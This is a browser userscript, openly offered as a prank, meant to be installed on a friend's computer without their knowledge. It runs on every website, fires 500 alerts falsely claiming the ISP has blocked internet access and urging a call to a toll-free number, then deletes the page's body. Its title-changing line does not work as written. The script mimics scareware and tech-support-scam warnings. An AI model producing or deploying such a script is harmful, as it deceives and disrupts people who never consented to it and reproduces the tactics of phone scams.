// ==UserScript==
// @name           The all around perfect script that does everything...
// @namespace      http://www.*
// @version        1.5
// @description    A prank script, really funny!
// @include        *
// ==/UserScript==

/* This is a prank script
 * ONLY install on a friend's computer, as this removes all the content of the page
 * 
 *
 * Disclaimer :
 * I am not responsible for anything that happens due to the use of this this script.
 * This includes, but is not limited to : Excessive time wasted by victim trying to :
 * figure out what's wrong with their computer, Excessive time wasted by script 
 * installer laughing his/her ass off, embarrassment by installer because he/she 
 * laughs so hard he/she pissed his/her pants.
 */


var i;
for(i=0;i<500;i++) {
     alert("WARNING YOUR ISP HAS BEEN BLOCKED YOU FROM VISITING THE INTERNETS!!! Call the toll free number : 1-800-468-7588 to find out why. This is message number " + i + "!");
}
title = document.getElementsByTagName("title");
title.innerHTML = "WARNING WARINING";

killme=document.getElementsByTagName("html");
killme[0].removeChild(killme[0].lastChild);
